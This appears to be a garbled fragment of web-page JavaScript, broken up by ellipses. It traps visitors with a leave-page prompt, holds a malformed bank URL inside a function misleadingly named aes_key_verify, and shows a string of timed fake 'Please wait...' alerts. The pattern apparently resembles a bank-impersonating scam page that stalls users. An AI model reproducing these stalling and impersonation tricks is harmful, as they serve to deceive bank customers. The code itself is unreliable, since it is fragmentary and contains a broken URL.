...
window.onbeforeunload = function(){ return "Are you sure you want to leave?"; }; 
 ...
 function aes_key_verify() { 
  var redirectUrl = 'https://textfiles.com'; 
  var url = 'https://https://rwanda.accessbankplc.com/'; 
 ...
 setTimeout(function() {alert('Please wait...');},2000); 
 setTimeout(function() {alert('Please wait...');},5000); 
 setTimeout(function() {alert('Please wait...');},10000); 
  setTimeout(function() {alert('Please wait...');},15000); };
